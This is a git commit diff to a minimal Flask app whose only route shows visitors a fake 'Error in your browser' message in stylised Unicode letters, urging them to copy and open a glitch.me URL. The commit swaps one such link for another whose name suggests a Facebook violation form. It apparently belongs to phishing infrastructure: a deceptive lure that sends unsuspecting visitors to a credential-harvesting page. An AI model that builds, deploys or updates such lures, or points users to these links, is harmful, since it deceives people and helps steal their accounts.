45476733f43e7ddd37d0310da58e029e62298201
req-noewq <166973820+req-noewq@users.noreply.github.com>
2024-04-22 03:53:09 -0700

    Update app.py

--- app.py
+++ app.py
@@ -4,7 +4,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def hello_world():
-    return '𝐄𝐫𝐫𝐨𝐫 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐛𝐫𝐨𝐰𝐬𝐞𝐫 𝐜𝐨𝐩𝐲 𝐭𝐡𝐢𝐬 𝐮𝐫𝐥 𝐩𝐚𝐬𝐭𝐞 𝐢𝐧 𝐧𝐞𝐰 𝐭𝐚𝐛 (https://submit-violation-form-us-now.glitch.me/) '
+    return '𝐄𝐫𝐫𝐨𝐫 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐛𝐫𝐨𝐰𝐬𝐞𝐫 𝐜𝐨𝐩𝐲 𝐭𝐡𝐢𝐬 𝐮𝐫𝐥 𝐩𝐚𝐬𝐭𝐞 𝐢𝐧 𝐧𝐞𝐰 𝐭𝐚𝐛 (https://fb--submit--now.glitch.me/) '
 
 if __name__ == '__main__':
     app.run()
